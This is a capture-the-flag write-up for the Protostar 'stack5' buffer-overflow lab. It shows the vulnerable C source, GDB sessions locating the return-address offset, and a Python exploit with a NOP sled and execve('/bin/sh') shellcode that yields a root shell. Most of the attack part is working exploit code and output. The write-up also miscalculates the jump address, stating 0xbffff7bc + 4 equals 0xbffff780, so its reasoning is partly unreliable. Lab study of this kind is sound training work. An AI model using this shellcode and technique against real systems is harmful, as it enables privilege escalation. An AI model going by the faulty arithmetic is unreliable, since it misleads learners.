# Stack5

URL: https://exploit.education/protostar/stack-five/
Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints

- At this point in time, it might be easier to use someone elses shellcode
- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
  remove the int3s once your shellcode is done.
- Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

# Writeup

Here we have to use the shell code
Steps to follow:

1. check for the padding using random string and you will get the padding from the `$eip` and `$ebp` pointer
2. we have to get the address from where we can enter our shell
3. thirdly, we will get error in our method and after debugging I found out that, the address is different, so we have to use `NOP` for that.

So let us start from GDB.

```
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb) break *0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
(gdb) r
Starting program: /opt/protostar/bin/stack5
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT

Breakpoint 1, main (argc=0, argv=0xbffff864) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) x/24x $esp
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x41414141      0x42424242      0x43434343      0x44444444
0xbffff780:     0x45454545      0x46464646      0x47474747      0x48484848
0xbffff790:     0x49494949      0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c
0xbffff7a0:     0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f      0x50505050
0xbffff7b0:     0x51515151      0x52525252      0x53535353      0x54545454
(gdb) info frames
Undefined info command: "frames".  Try "help info".
(gdb) info frame
Stack level 0, frame at 0xbffff7c0:
 eip = 0x80483d9 in main (stack5/stack5.c:11); saved eip 0x54545454
 source language c.
 Arglist at 0xbffff7b8, args: argc=0, argv=0xbffff864
 Locals at 0xbffff7b8, Previous frame's sp is 0xbffff7c0
 Saved registers:
  ebp at 0xbffff7b8, eip at 0xbffff7bc
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb)
(gdb)
(gdb)
(gdb)
(gdb) r
Starting program: /opt/protostar/bin/stack5
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xb7eadc03 in __libc_start_main (main=Cannot access memory at address 0x5353535b
) at libc-start.c:187
187     libc-start.c: No such file or directory.
        in libc-start.c
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) c
The program is not being run.
(gdb)
The program is not being run.
(gdb)
The program is not being run.
(gdb) r
Starting program: /opt/protostar/bin/stack5
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) info frame
Stack level 0, frame at 0xbffff7c0:
 eip = 0x80483d9 in main (stack5/stack5.c:11); saved eip 0xb7eadc00
 source language c.
 Arglist at 0xbffff7b8, args: argc=1, argv=0xbffff864
 Locals at 0xbffff7b8, Previous frame's sp is 0xbffff7c0
 Saved registers:
  ebp at 0xbffff7b8, eip at 0xbffff7bc
```

From this, we can say that the offset is `76` and the `$eip` pointer will be 4 bytes after the current `$eip`, so `0xbffff7bc` + `4` = `0xbffff780`.

Then as per the discussion, we will append `NOP` the the hex value of `NOP` is `\x90` and will add 100 times (it doesn't matter how many time we add NOP)

Then adding shellcode from the `shell storm` website.

Therefore, the exploit will be

```
user@protostar:/tmp$ cat exploit.py
import struct
padding = '\x41'*76
eip = struct.pack("I", 0xbffff780)
nop = "\x90" * 100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding + eip + nop + shellcode
```

---

Solution:

```
user@protostar:/tmp$ (python exploit.py && cat) | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
